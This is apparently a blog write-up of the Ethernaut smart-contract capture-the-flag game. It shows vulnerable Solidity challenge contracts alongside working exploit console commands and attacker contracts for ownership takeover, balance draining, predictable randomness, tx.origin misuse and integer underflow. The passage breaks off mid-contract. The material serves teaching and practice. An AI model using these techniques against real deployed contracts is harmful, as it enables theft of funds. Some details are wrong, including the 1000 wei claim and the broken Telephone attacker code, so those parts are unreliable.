<!doctype html><html class=scroll-smooth lang=en><head><meta charset=utf-8><link href=/css/style.css rel=stylesheet><link href=/line-awesome/css/line-awesome.min.css rel=stylesheet><script defer src=/js/main.js></script><title>Ethernaut succinct writeup. Where i got start | Random thoughts here</title><body class="bg-white dark:bg-slate-900 transition ease-in-out"><section><div class="sticky top-0 bg-slate-100 dark:bg-slate-800"><div class="container mx-auto flex place-content-between py-16 lg:py-8 font-sans text-6xl lg:text-2xl text-slate-900 dark:text-slate-300"><div class=flex><a class="m-0 p-0 text-slate-900 hover:text-slate-700 dark:text-slate-300 dark:hover:text-slate-200" href=/blog/> /blog </a></div><div class="flex gap-4"><div class="hidden cursor-pointer" id=back-to-top><i class="las la-level-up-alt"></i></div><a href=/><i class="las la-home"></i></a><div class=cursor-pointer id=darkmode-toggle><div class="hidden dark:inline"><i class="las la-sun"></i></div><div class="inline dark:hidden"><i class="las la-moon"></i></div></div></div></div></div><script async id=MathJax-script src=https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js></script><script type=text/x-mathjax-config>
      MathJax.Hub.Config({
        tex2jax: {inlineMath: [['$','$']]}
      });
    </script><div class="container mb-16"><div class="mt-4 font-serif text-slate-600 dark:text-slate-500 text-4xl lg:text-base">2023-10-12</div><h1 class="w-full mt-4 mb-8 font-serif text-8xl lg:text-4xl text-slate-900 dark:text-slate-300">Ethernaut succinct writeup. Where i got start</h1><div class="w-100 border-t mb-8 border-slate-300 dark:border-slate-700"></div><div class=prose-boring><p>Online game <a href=https://ethernaut.openzeppelin.com/>Ethernaut</a>, Using SepoliaETH from <a href=https://sepolia-faucet.pk910.de/#/>mining faucet</a>. My account address is <code>0xe24C5c44a7c4E75d5E2e461C35d863db0385E3c9</code>. I only use it for testnet for security.<h2 id=hello-ethernaut>Hello Ethernaut</h2><p>Interact with contracts to complete challenges<pre class=language-js data-lang=js style=color:#d8dee9;background-color:#2e3440><code class=language-js data-lang=js><span style=color:#81a1c1>> await </span><span>contract</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>info</span><span>()
</span><span style=color:#81a1c1>< </span><span style=color:#a3be8c>'You will find what you need in info1().'
</span><span style=color:#81a1c1>> await </span><span>contract</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>info1</span><span>()
</span><span style=color:#81a1c1>< </span><span style=color:#a3be8c>'You will find what you need in info2().'
</span><span style=color:#81a1c1>> await </span><span>contract</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>info2</span><span>()
</span><span style=color:#81a1c1>< </span><span style=color:#a3be8c>'The property infoNum holds the number of the next info method to call.'
</span><span style=color:#81a1c1>> await </span><span>contract</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>infoNum</span><span>()
</span><span style=color:#81a1c1>< </span><span>{</span><span style=color:#5e81ac>words</span><span style=color:#eceff4>: </span><span>[</span><span style=color:#b48ead>42</span><span>]}
</span><span style=color:#81a1c1>> await </span><span>contract</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>info42</span><span>()
</span><span style=color:#81a1c1><</span><span style=color:#a3be8c>'theMethodName is the name of the next method.'
</span><span style=color:#81a1c1>> await </span><span>contract</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>theMethodName</span><span>()
</span><span style=color:#81a1c1>< </span><span style=color:#a3be8c>'The method name is method7123949.'
</span><span style=color:#81a1c1>> await </span><span>contract</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>method7123949</span><span>()
</span><span style=color:#81a1c1><</span><span style=color:#a3be8c>'If you know the password, submit it to authenticate().'
</span><span style=color:#81a1c1>> await </span><span>contract</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>password</span><span>()
</span><span style=color:#81a1c1><</span><span style=color:#a3be8c>'ethernaut0'
</span><span style=color:#81a1c1>> await </span><span>contract</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>authenticate</span><span>(</span><span style=color:#a3be8c>'ethernaut0'</span><span>)
</span></code></pre><p>solidity source:<pre class=language-solidity data-lang=solidity style=color:#d8dee9;background-color:#2e3440><code class=language-solidity data-lang=solidity><span style=color:#616e88>// SPDX-License-Identifier: MIT
</span><span>pragma solidity ^</span><span style=color:#b48ead>0.8.0</span><span>;
</span><span>
</span><span>contract </span><span style=color:#88c0d0>Instance </span><span>{
</span><span>
</span><span>  </span><span style=color:#81a1c1>string public</span><span> password;
</span><span>  </span><span style=color:#81a1c1>uint8 public</span><span> infoNum </span><span style=color:#81a1c1>= </span><span style=color:#b48ead>42</span><span>;
</span><span>  </span><span style=color:#81a1c1>string public</span><span> theMethodName </span><span style=color:#81a1c1>= </span><span>'The method name is method7123949.';
</span><span>  </span><span style=color:#81a1c1>bool private</span><span> cleared </span><span style=color:#81a1c1>= false</span><span>;
</span><span>
</span><span>  </span><span style=color:#616e88>// constructor
</span><span>  constructor(</span><span style=color:#81a1c1>string memory </span><span>_password) {
</span><span>    password </span><span style=color:#81a1c1>=</span><span> _password;
</span><span>  }
</span><span>
</span><span>  function </span><span style=color:#88c0d0>info</span><span>() </span><span style=color:#81a1c1>public pure </span><span>returns (</span><span style=color:#81a1c1>string</span><span> memory) {
</span><span>    return 'You will find what you need in info1().';
</span><span>  }
</span><span>
</span><span>  function </span><span style=color:#88c0d0>info1</span><span>() </span><span style=color:#81a1c1>public pure </span><span>returns (</span><span style=color:#81a1c1>string</span><span> memory) {
</span><span>    return 'Try info2(), but with "hello" as a parameter.';
</span><span>  }
</span><span>
</span><span>  function </span><span style=color:#88c0d0>info2</span><span>(</span><span style=color:#81a1c1>string memory </span><span>param) </span><span style=color:#81a1c1>public pure </span><span>returns (</span><span style=color:#81a1c1>string</span><span> memory) {
</span><span>    if(</span><span style=color:#81a1c1>keccak256</span><span>(</span><span style=color:#81a1c1>abi</span><span>.</span><span style=color:#81a1c1>encodePacked</span><span>(param)) </span><span style=color:#81a1c1>== keccak256</span><span>(</span><span style=color:#81a1c1>abi</span><span>.</span><span style=color:#81a1c1>encodePacked</span><span>('hello'))) {
</span><span>      return 'The property infoNum holds the number of the next info method to call.';
</span><span>    }
</span><span>    return 'Wrong parameter.';
</span><span>  }
</span><span>
</span><span>  function </span><span style=color:#88c0d0>info42</span><span>() </span><span style=color:#81a1c1>public pure </span><span>returns (</span><span style=color:#81a1c1>string</span><span> memory) {
</span><span>    return 'theMethodName is the name of the next method.';
</span><span>  }
</span><span>
</span><span>  function </span><span style=color:#88c0d0>method7123949</span><span>() </span><span style=color:#81a1c1>public pure </span><span>returns (</span><span style=color:#81a1c1>string</span><span> memory) {
</span><span>    return 'If you know the password, submit it to authenticate().';
</span><span>  }
</span><span>
</span><span>  function </span><span style=color:#88c0d0>authenticate</span><span>(</span><span style=color:#81a1c1>string memory </span><span>passkey) </span><span style=color:#81a1c1>public </span><span>{
</span><span>    if(</span><span style=color:#81a1c1>keccak256</span><span>(</span><span style=color:#81a1c1>abi</span><span>.</span><span style=color:#81a1c1>encodePacked</span><span>(passkey)) </span><span style=color:#81a1c1>== keccak256</span><span>(</span><span style=color:#81a1c1>abi</span><span>.</span><span style=color:#81a1c1>encodePacked</span><span>(password))) {
</span><span>      cleared </span><span style=color:#81a1c1>= true</span><span>;
</span><span>    }
</span><span>  }
</span><span>
</span><span>  function </span><span style=color:#88c0d0>getCleared</span><span>() </span><span style=color:#81a1c1>public view </span><span>returns (</span><span style=color:#81a1c1>bool</span><span>) {
</span><span>    return cleared;
</span><span>  }
</span><span>}
</span></code></pre><h2 id=fallback>Fallback</h2><pre class=language-solidity data-lang=solidity style=color:#d8dee9;background-color:#2e3440><code class=language-solidity data-lang=solidity><span style=color:#616e88>// SPDX-License-Identifier: MIT
</span><span>pragma solidity ^</span><span style=color:#b48ead>0.8.0</span><span>;
</span><span>
</span><span>contract </span><span style=color:#88c0d0>Fallback </span><span>{
</span><span>
</span><span>  mapping(</span><span style=color:#81a1c1>address </span><span>=> </span><span style=color:#81a1c1>uint</span><span>) </span><span style=color:#81a1c1>public</span><span> contributions;
</span><span>  </span><span style=color:#81a1c1>address public</span><span> owner;
</span><span>
</span><span>  constructor() {
</span><span>    owner </span><span style=color:#81a1c1>= msg</span><span>.</span><span style=color:#81a1c1>sender</span><span>;
</span><span>    contributions[</span><span style=color:#81a1c1>msg</span><span>.</span><span style=color:#81a1c1>sender</span><span>] </span><span style=color:#81a1c1>= </span><span style=color:#b48ead>1000 </span><span style=color:#81a1c1>* </span><span>(</span><span style=color:#b48ead>1 ether</span><span>);
</span><span>  }
</span><span>
</span><span>  modifier </span><span style=color:#88c0d0>onlyOwner </span><span>{
</span><span>        require(
</span><span>            </span><span style=color:#81a1c1>msg</span><span>.</span><span style=color:#81a1c1>sender ==</span><span> owner,
</span><span>            "caller is not the owner"
</span><span>        );
</span><span>        _;
</span><span>    }
</span><span>
</span><span>  function </span><span style=color:#88c0d0>contribute</span><span>() </span><span style=color:#81a1c1>public payable </span><span>{
</span><span>    require(</span><span style=color:#81a1c1>msg</span><span>.</span><span style=color:#81a1c1>value < </span><span style=color:#b48ead>0.001 ether</span><span>);
</span><span>    contributions[</span><span style=color:#81a1c1>msg</span><span>.</span><span style=color:#81a1c1>sender</span><span>] </span><span style=color:#81a1c1>+= msg</span><span>.</span><span style=color:#81a1c1>value</span><span>;
</span><span>    if(contributions[</span><span style=color:#81a1c1>msg</span><span>.</span><span style=color:#81a1c1>sender</span><span>] </span><span style=color:#81a1c1>></span><span> contributions[owner]) {
</span><span>      owner </span><span style=color:#81a1c1>= msg</span><span>.</span><span style=color:#81a1c1>sender</span><span>;
</span><span>    }
</span><span>  }
</span><span>
</span><span>  function </span><span style=color:#88c0d0>getContribution</span><span>() </span><span style=color:#81a1c1>public view </span><span>returns (</span><span style=color:#81a1c1>uint</span><span>) {
</span><span>    return contributions[</span><span style=color:#81a1c1>msg</span><span>.</span><span style=color:#81a1c1>sender</span><span>];
</span><span>  }
</span><span>
</span><span>  function </span><span style=color:#88c0d0>withdraw</span><span>() </span><span style=color:#81a1c1>public onlyOwner </span><span>{
</span><span>    </span><span style=color:#81a1c1>payable</span><span>(owner).</span><span style=color:#88c0d0>transfer</span><span>(</span><span style=color:#81a1c1>address</span><span>(</span><span style=color:#81a1c1>this</span><span>).balance);
</span><span>  }
</span><span>
</span><span>  receive() </span><span style=color:#81a1c1>external payable </span><span>{
</span><span>    require(</span><span style=color:#81a1c1>msg</span><span>.</span><span style=color:#81a1c1>value > </span><span style=color:#b48ead>0 </span><span style=color:#81a1c1>&&</span><span> contributions[</span><span style=color:#81a1c1>msg</span><span>.</span><span style=color:#81a1c1>sender</span><span>] </span><span style=color:#81a1c1>> </span><span style=color:#b48ead>0</span><span>);
</span><span>    owner </span><span style=color:#81a1c1>= msg</span><span>.</span><span style=color:#81a1c1>sender</span><span>;
</span><span>  }
</span><span>}
</span></code></pre><p>There are two function could be used claim ownership of the contract. Since the original owner have 1000 wei in wallet, the function <code>contribute()</code>was hard to exploit. But requirement of <code>receive()</code>could easily be satisfied by using <code>contribute()</code>.<pre class=language-js data-lang=js style=color:#d8dee9;background-color:#2e3440><code class=language-js data-lang=js><span style=color:#616e88>// need to refer to the API documentation of web3.js https://web3js.readthedocs.io/en/v1.10.0/
</span><span style=color:#81a1c1>> await </span><span>contract</span><span style=color:#81a1c1>.</span><span>contribute</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>sendTransaction</span><span>({from</span><span style=color:#eceff4>: </span><span>player</span><span style=color:#eceff4>, </span><span>value</span><span style=color:#eceff4>: </span><span style=color:#88c0d0>toWei</span><span>(</span><span style=color:#a3be8c>'0.0009'</span><span>)})
</span><span style=color:#81a1c1>< </span><span>{</span><span style=color:#5e81ac>tx</span><span style=color:#eceff4>: </span><span style=color:#a3be8c>'0x8868e98a26a35a88c57d2cadf24f40fb505a8b18b9bc047b9ca307fea4964068'</span><span style=color:#eceff4>, </span><span style=color:#5e81ac>receipt</span><span style=color:#eceff4>: </span><span>{…}</span><span style=color:#eceff4>, </span><span style=color:#5e81ac>logs</span><span style=color:#eceff4>: </span><span style=color:#8fbcbb>Array</span><span>(</span><span style=color:#b48ead>0</span><span>)}
</span><span style=color:#81a1c1>> await </span><span style=color:#88c0d0>sendTransaction</span><span>({from</span><span style=color:#eceff4>: </span><span>player</span><span style=color:#eceff4>, </span><span>to</span><span style=color:#eceff4>: </span><span>contract</span><span style=color:#81a1c1>.</span><span>address</span><span style=color:#eceff4>, </span><span>value</span><span style=color:#eceff4>: </span><span style=color:#88c0d0>toWei</span><span>(</span><span style=color:#a3be8c>'0.00001'</span><span>)})
</span><span style=color:#81a1c1>< </span><span style=color:#a3be8c>'0x4f13c20bdb389b3901633d1665c466f48795f3e05f0a31e68f57135b512333e5'
</span><span style=color:#81a1c1>> await </span><span>contract</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>owner</span><span>()
</span><span style=color:#81a1c1>< </span><span style=color:#a3be8c>'0xe24C5c44a7c4E75d5E2e461C35d863db0385E3c9'
</span><span style=color:#81a1c1>> </span><span>player
</span><span style=color:#81a1c1>< </span><span style=color:#a3be8c>'0xe24C5c44a7c4E75d5E2e461C35d863db0385E3c9'
</span><span style=color:#81a1c1>> await </span><span>contract</span><span style=color:#81a1c1>.</span><span>withdraw</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>sendTransaction</span><span>()
</span><span style=color:#81a1c1>< </span><span>{</span><span style=color:#5e81ac>tx</span><span style=color:#eceff4>: </span><span style=color:#a3be8c>'0x0eea3783ce911fb2c7fda42b5f44f60b63c1b6f1e862a7e463bbd6469e592320'</span><span style=color:#eceff4>, </span><span style=color:#5e81ac>receipt</span><span style=color:#eceff4>: </span><span>{…}</span><span style=color:#eceff4>, </span><span style=color:#5e81ac>logs</span><span style=color:#eceff4>: </span><span style=color:#8fbcbb>Array</span><span>(</span><span style=color:#b48ead>0</span><span>)}
</span><span style=color:#81a1c1>> await </span><span>web3</span><span style=color:#81a1c1>.</span><span>eth</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>getBalance</span><span>(contract</span><span style=color:#81a1c1>.</span><span>address)
</span><span style=color:#81a1c1>< </span><span style=color:#a3be8c>'0'
</span></code></pre><h2 id=fallout>Fallout</h2><pre class=language-solidity data-lang=solidity style=color:#d8dee9;background-color:#2e3440><code class=language-solidity data-lang=solidity><span style=color:#616e88>// SPDX-License-Identifier: MIT
</span><span>pragma solidity ^</span><span style=color:#b48ead>0.6.0</span><span>;
</span><span>
</span><span>import 'openzeppelin-contracts-06/math/SafeMath.sol';
</span><span>
</span><span>contract </span><span style=color:#88c0d0>Fallout </span><span>{
</span><span>  
</span><span>  using SafeMath for </span><span style=color:#81a1c1>uint256</span><span>;
</span><span>  mapping (</span><span style=color:#81a1c1>address </span><span>=> </span><span style=color:#81a1c1>uint</span><span>) allocations;
</span><span>  </span><span style=color:#81a1c1>address payable public</span><span> owner;
</span><span>
</span><span>
</span><span>  function </span><span style=color:#88c0d0>Fal1out</span><span>() </span><span style=color:#81a1c1>public payable </span><span>{
</span><span>    owner </span><span style=color:#81a1c1>= msg</span><span>.</span><span style=color:#81a1c1>sender</span><span>;
</span><span>    allocations[owner] </span><span style=color:#81a1c1>= msg</span><span>.</span><span style=color:#81a1c1>value</span><span>;
</span><span>  }
</span><span>
</span><span>  modifier </span><span style=color:#88c0d0>onlyOwner </span><span>{
</span><span>	        require(
</span><span>	            </span><span style=color:#81a1c1>msg</span><span>.</span><span style=color:#81a1c1>sender ==</span><span> owner,
</span><span>	            "caller is not the owner"
</span><span>	        );
</span><span>	        _;
</span><span>	    }
</span><span>
</span><span>  function </span><span style=color:#88c0d0>allocate</span><span>() </span><span style=color:#81a1c1>public payable </span><span>{
</span><span>    allocations[</span><span style=color:#81a1c1>msg</span><span>.</span><span style=color:#81a1c1>sender</span><span>] </span><span style=color:#81a1c1>=</span><span> allocations[</span><span style=color:#81a1c1>msg</span><span>.</span><span style=color:#81a1c1>sender</span><span>].</span><span style=color:#88c0d0>add</span><span>(</span><span style=color:#81a1c1>msg</span><span>.</span><span style=color:#81a1c1>value</span><span>);
</span><span>  }
</span><span>
</span><span>  function </span><span style=color:#88c0d0>sendAllocation</span><span>(</span><span style=color:#81a1c1>address payable </span><span>allocator) </span><span style=color:#81a1c1>public </span><span>{
</span><span>    require(allocations[allocator] </span><span style=color:#81a1c1>> </span><span style=color:#b48ead>0</span><span>);
</span><span>    allocator.</span><span style=color:#88c0d0>transfer</span><span>(allocations[allocator]);
</span><span>  }
</span><span>
</span><span>  function </span><span style=color:#88c0d0>collectAllocations</span><span>() </span><span style=color:#81a1c1>public onlyOwner </span><span>{
</span><span>    </span><span style=color:#81a1c1>msg</span><span>.</span><span style=color:#81a1c1>sender</span><span>.</span><span style=color:#88c0d0>transfer</span><span>(</span><span style=color:#81a1c1>address</span><span>(</span><span style=color:#81a1c1>this</span><span>).balance);
</span><span>  }
</span><span>
</span><span>  function </span><span style=color:#88c0d0>allocatorBalance</span><span>(</span><span style=color:#81a1c1>address </span><span>allocator) </span><span style=color:#81a1c1>public view </span><span>returns (</span><span style=color:#81a1c1>uint</span><span>) {
</span><span>    return allocations[allocator];
</span><span>  }
</span><span>}
</span></code></pre><p>In early version of solidity, the function with the same name as the contract was used as the constructor. Wrong spelling of word <code>Fallout</code> causes <code>owner </code> variable to be uninitialized and can be called externally for assignment. Reference https://docs.soliditylang.org/en/v0.8.21/050-breaking-changes.html#constructors<pre class=language-js data-lang=js style=color:#d8dee9;background-color:#2e3440><code class=language-js data-lang=js><span style=color:#81a1c1>> await </span><span>contract</span><span style=color:#81a1c1>.</span><span>Fal1out</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>sendTransaction</span><span>()
</span><span style=color:#81a1c1>< </span><span>{</span><span style=color:#5e81ac>tx</span><span style=color:#eceff4>: </span><span style=color:#a3be8c>'0xca9b301bac18f13c460eb71103e972efbe08bc07821a322945b947e629aa445d'</span><span style=color:#eceff4>, </span><span style=color:#5e81ac>receipt</span><span style=color:#eceff4>: </span><span>{…}</span><span style=color:#eceff4>, </span><span style=color:#5e81ac>logs</span><span style=color:#eceff4>: </span><span style=color:#8fbcbb>Array</span><span>(</span><span style=color:#b48ead>0</span><span>)}
</span><span style=color:#81a1c1>> await </span><span>contract</span><span style=color:#81a1c1>.</span><span style=color:#88c0d0>owner</span><span>() </span><span style=color:#81a1c1>== </span><span>player
</span><span style=color:#81a1c1>< true
</span></code></pre><h2 id=coin-flip>Coin Flip</h2><pre class=language-solidity data-lang=solidity style=color:#d8dee9;background-color:#2e3440><code class=language-solidity data-lang=solidity><span style=color:#616e88>// SPDX-License-Identifier: MIT
</span><span>pragma solidity ^</span><span style=color:#b48ead>0.8.0</span><span>;
</span><span>
</span><span>contract </span><span style=color:#88c0d0>CoinFlip </span><span>{
</span><span>
</span><span>  </span><span style=color:#81a1c1>uint256 public</span><span> consecutiveWins;
</span><span>  </span><span style=color:#81a1c1>uint256</span><span> lastHash;
</span><span>  </span><span style=color:#81a1c1>uint256</span><span> FACTOR </span><span style=color:#81a1c1>= </span><span style=color:#b48ead>57896044618658097711785492504343953926634992332820282019728792003956564819968</span><span>;
</span><span>
</span><span>  constructor() {
</span><span>    consecutiveWins </span><span style=color:#81a1c1>= </span><span style=color:#b48ead>0</span><span>;
</span><span>  }
</span><span>
</span><span>  function </span><span style=color:#88c0d0>flip</span><span>(</span><span style=color:#81a1c1>bool </span><span>_guess) </span><span style=color:#81a1c1>public </span><span>returns (</span><span style=color:#81a1c1>bool</span><span>) {
</span><span>    </span><span style=color:#81a1c1>uint256</span><span> blockValue </span><span style=color:#81a1c1>= uint256</span><span>(</span><span style=color:#81a1c1>blockhash</span><span>(</span><span style=color:#81a1c1>block</span><span>.</span><span style=color:#81a1c1>number - </span><span style=color:#b48ead>1</span><span>));
</span><span>
</span><span>    if (lastHash </span><span style=color:#81a1c1>==</span><span> blockValue) {
</span><span>      revert();
</span><span>    }
</span><span>
</span><span>    lastHash </span><span style=color:#81a1c1>=</span><span> blockValue;
</span><span>    </span><span style=color:#81a1c1>uint256</span><span> coinFlip </span><span style=color:#81a1c1>=</span><span> blockValue </span><span style=color:#81a1c1>/</span><span> FACTOR;
</span><span>    </span><span style=color:#81a1c1>bool</span><span> side </span><span style=color:#81a1c1>=</span><span> coinFlip </span><span style=color:#81a1c1>== </span><span style=color:#b48ead>1 </span><span style=color:#81a1c1>? true : false</span><span>;
</span><span>
</span><span>    if (side </span><span style=color:#81a1c1>==</span><span> _guess) {
</span><span>      consecutiveWins</span><span style=color:#81a1c1>++</span><span>;
</span><span>      return </span><span style=color:#81a1c1>true</span><span>;
</span><span>    } else {
</span><span>      consecutiveWins </span><span style=color:#81a1c1>= </span><span style=color:#b48ead>0</span><span>;
</span><span>      return </span><span style=color:#81a1c1>false</span><span>;
</span><span>    }
</span><span>  }
</span><span>}
</span></code></pre><p>The target is to increase consistentWins to 10, which is the value of successfully guess the <code>side</code> variable ten times in a row.<p>Observing the generation logic of the side variable, easily know that this is a pseudo-random number generation method. This means that we can predict this result in the attacker’s contract.<pre class=language-solidity data-lang=solidity style=color:#d8dee9;background-color:#2e3440><code class=language-solidity data-lang=solidity><span style=color:#616e88>// SPDX-License-Identifier: MIT
</span><span>pragma solidity ^</span><span style=color:#b48ead>0.8.0</span><span>;
</span><span>
</span><span>
</span><span>import './SafeMath.sol'; </span><span style=color:#616e88>// https://github.com/ConsenSysMesh/openzeppelin-solidity/blob/master/contracts/math/SafeMath.sol
</span><span>import './coinflip.sol'; </span><span style=color:#616e88>// challenge source code
</span><span>
</span><span>contract </span><span style=color:#88c0d0>Attacker</span><span>{
</span><span>
</span><span>    using SafeMath for </span><span style=color:#81a1c1>uint256</span><span>;
</span><span>    CoinFlip </span><span style=color:#81a1c1>public </span><span>coinFlipContract;
</span><span>    </span><span style=color:#81a1c1>uint256</span><span> FACTOR </span><span style=color:#81a1c1>= </span><span style=color:#b48ead>57896044618658097711785492504343953926634992332820282019728792003956564819968</span><span>;
</span><span>
</span><span>    constructor(</span><span style=color:#81a1c1>address </span><span>_coinFlipContract) {
</span><span>        coinFlipContract </span><span style=color:#81a1c1>= </span><span style=color:#88c0d0>CoinFlip</span><span>(_coinFlipContract);
</span><span>    }
</span><span>    function </span><span style=color:#88c0d0>guessFlip</span><span>() </span><span style=color:#81a1c1>public </span><span>{
</span><span>
</span><span>        </span><span style=color:#81a1c1>uint256</span><span> blockValue </span><span style=color:#81a1c1>= uint256</span><span>(</span><span style=color:#81a1c1>blockhash</span><span>(</span><span style=color:#81a1c1>block</span><span>.</span><span style=color:#81a1c1>number</span><span>.</span><span style=color:#88c0d0>sub</span><span>(</span><span style=color:#b48ead>1</span><span>)));
</span><span>        </span><span style=color:#81a1c1>uint256</span><span> coinFlip </span><span style=color:#81a1c1>=</span><span> blockValue.</span><span style=color:#88c0d0>div</span><span>(FACTOR);
</span><span>        </span><span style=color:#81a1c1>bool</span><span> guess </span><span style=color:#81a1c1>=</span><span> coinFlip </span><span style=color:#81a1c1>== </span><span style=color:#b48ead>1 </span><span style=color:#81a1c1>? true : false</span><span>;
</span><span>
</span><span>        coinFlipContract.</span><span style=color:#88c0d0>flip</span><span>(guess);
</span><span>    }
</span><span>}
</span></code></pre><h2 id=telephone>Telephone</h2><pre class=language-solidity data-lang=solidity style=color:#d8dee9;background-color:#2e3440><code class=language-solidity data-lang=solidity><span style=color:#616e88>// SPDX-License-Identifier: MIT
</span><span>pragma solidity ^</span><span style=color:#b48ead>0.8.0</span><span>;
</span><span>
</span><span>contract </span><span style=color:#88c0d0>Telephone </span><span>{
</span><span>
</span><span>  </span><span style=color:#81a1c1>address public</span><span> owner;
</span><span>
</span><span>  constructor() {
</span><span>    owner </span><span style=color:#81a1c1>= msg</span><span>.</span><span style=color:#81a1c1>sender</span><span>;
</span><span>  }
</span><span>
</span><span>  function </span><span style=color:#88c0d0>changeOwner</span><span>(</span><span style=color:#81a1c1>address </span><span>_owner) </span><span style=color:#81a1c1>public </span><span>{
</span><span>    if (</span><span style=color:#81a1c1>tx</span><span>.</span><span style=color:#81a1c1>origin != msg</span><span>.</span><span style=color:#81a1c1>sender</span><span>) {
</span><span>      owner </span><span style=color:#81a1c1>=</span><span> _owner;
</span><span>    }
</span><span>  }
</span><span>}
</span></code></pre><p>For claiming ownership of the contract, just need to make the values of <code>tx.origin</code> and <code>msg.sender</code> unequal. Reference to https://docs.soliditylang.org/en/v0.8.21/cheatsheet.html#block-and-transaction-properties, <code>msg.sender</code> would return address of sender of the message (current call) while <code>tx.origin</code> return the address of sender of the transaction (full call chain), which mean the <code>tx.origin</code> must be a <code>Externally Owned Account</code> and <code>msg.sender</code> could be a <code>contract account</code> used for indirect calls.<p>Just deploy a contract for indirectly calling would satisfied the requirements.<pre class=language-solidity data-lang=solidity style=color:#d8dee9;background-color:#2e3440><code class=language-solidity data-lang=solidity><span style=color:#616e88>// SPDX-License-Identifier: MIT
</span><span>pragma solidity ^</span><span style=color:#b48ead>0.8.0</span><span>;
</span><span>
</span><span>import './Telephone.sol';
</span><span>
</span><span>contract </span><span style=color:#88c0d0>Attacker </span><span>{
</span><span>  Telephone _telephone;
</span><span>  constructor(</span><span style=color:#81a1c1>address </span><span>_address) {
</span><span>    _telephone </span><span style=color:#81a1c1>= </span><span>new </span><span style=color:#88c0d0>Telephone</span><span>(_address);
</span><span>  }
</span><span>  function </span><span style=color:#88c0d0>IndirectlyCall</span><span>() {
</span><span>    _telephone.</span><span style=color:#88c0d0>changeOwner</span><span>(</span><span style=color:#81a1c1>msg</span><span>.</span><span style=color:#81a1c1>sender</span><span>);
</span><span>  }
</span><span>}
</span></code></pre><h2 id=token>Token</h2><pre class=language-solidity data-lang=solidity style=color:#d8dee9;background-color:#2e3440><code class=language-solidity data-lang=solidity><span style=color:#616e88>// SPDX-License-Identifier: MIT
</span><span>pragma solidity ^</span><span style=color:#b48ead>0.6.0</span><span>;
</span><span>
</span><span>contract </span><span style=color:#88c0d0>Token </span><span>{
</span><span>
</span><span>  mapping(</span><span style=color:#81a1c1>address </span><span>=> </span><span style=color:#81a1c1>uint</span><span>) balances;
</span><span>  </span><span style=color:#81a1c1>uint public</span><span> totalSupply;
</span><span>
</span><span>  constructor(</span><span style=color:#81a1c1>uint </span><span>_initialSupply) </span><span style=color:#81a1c1>public </span><span>{
</span><span>    balances[</span><span style=color:#81a1c1>msg</span><span>.</span><span style=color:#81a1c1>sender</span><span>] </span><span style=color:#81a1c1>=</span><span> totalSupply </span><span style=color:#81a1c1>=</span><span> _initialSupply;
</span><span>  }
</span><span>
</span><span>  function </span><span style=color:#88c0d0>transfer</span><span>(</span><span style=color:#81a1c1>address </span><span>_to, </span><span style=color:#81a1c1>uint </span><span>_value) </span><span style=color:#81a1c1>public </span><span>returns (</span><span style=color:#81a1c1>bool</span><span>) {
</span><span>    require(balances[</span><span style=color:#81a1c1>msg</span><span>.</span><span style=color:#81a1c1>sender</span><span>] </span><span style=color:#81a1c1>-</span><span> _value </span><span style=color:#81a1c1>>= </span><span style=color:#b48ead>0</span><span>);
</span><span>    balances[</span><span style=color:#81a1c1>msg</span><span>.</span><span style=color:#81a1c1>sender</span><span>] </span><span style=color:#81a1c1>-=</span><span> _value;
</span><span>    balances[_to] </span><span style=color:#81a1c1>+=</span><span> _value;
</span><span>    return </span><span style=color:#81a1c1>true</span><span>;
</span><span>  }
</span><span>
</span><span>  function </span><span style=color:#88c0d0>balanceOf</span><span>(</span><span style=color:#81a1c1>address </span><span>_owner) </span><span style=color:#81a1c1>public view </span><span>returns (</span><span style=color:#81a1c1>uint</span><span> balance) {
</span><span>    return balances[_owner];
</span><span>  }
</span><span>}
</span></code></pre><p>Easily noticed that the requirement <code>balances[msg.sender] - _value >= 0</code> doesn’t use SafeMath.sol, leading to overflow vulnerability. It is because <code>balances[msg.sender]</code> and <code>_value</code> was all declared as <code>uint</code>, and the result of the calculation will still be uint.<p>To solve this challenge, we need another account to call the transfer. Because both EOA and CA are applicable, just modify the Attacker contract in the former challenge <code>Telephone</code>, this challenge can be solved.<pre class=language-solidity data-lang=solidity style=color:#d8dee9;background-color:#2e3440><code class=language-solidity data-lang=solidity><span style=color:#616e88>// SPDX-License-Identifier: MIT
</span><span>pragma solidity ^</span><span style=color:#b48ead>0.8.0</span><span>;
</span><span>
</span><span>import './Token.sol';
</span><span>
</span><span>contract </span><span style=color:#88c0d0>Attacker </span><span>{
</span><span>  Token _token;
</span><span>  constructor(</span><span style=color:#81a1c1>address </span><span>_address) {
</span><span>    _token </span><span style=color:#81a1c1>= </span><span style=color:#88c0d0>Token</span><span>(_address);
</span><span>  }
</span><span>  function </span><span style=color:#88c0d0>IndirectlyCall</span><span>(</span><span style=color:#81a1c1>address </span><span>_address) </span><span style=color:#81a1c1>public </span><span>{
</span><span>    _token.</span><span style=color:#88c0d0>transfer</span><span>(_address, </span><span style=color:#b48ead>10000020</span><span>);
</span><span>  }
</span><span>}
</span></code></pre><h2 id=delegation>Delegation</h2><pre class=language-solidity data-lang=solidity style=color:#d8dee9;background-color:#2e3440><code class=language-solidity data-lang=solidity><span style=color:#616e88>// SPDX-License-Identifier: MIT
</span><span>pragma solidity ^</span><span style=color:#b48ead>0.8.0</span><span>;
</span><span>
</span><span>contract </span><span style=color:#88c0d0>Delegate </span><span>{
</span><span>
</span><span>  </span><span style=color:#81a1c1>address public</span><span> owner;
</span><span>
</span><span>  constructor(</span><span style=color:#81a1c1>address </span><span>_owner) {
</span><span>    owner </span><span style=color:#81a1c1>=</span><span> _owner;
</span><span>  }
</span><span>
</span><span>  function </span><span style=color:#88c0d0>pwn</span><span>() </span><span style=color:#81a1c1>public </span><span>{
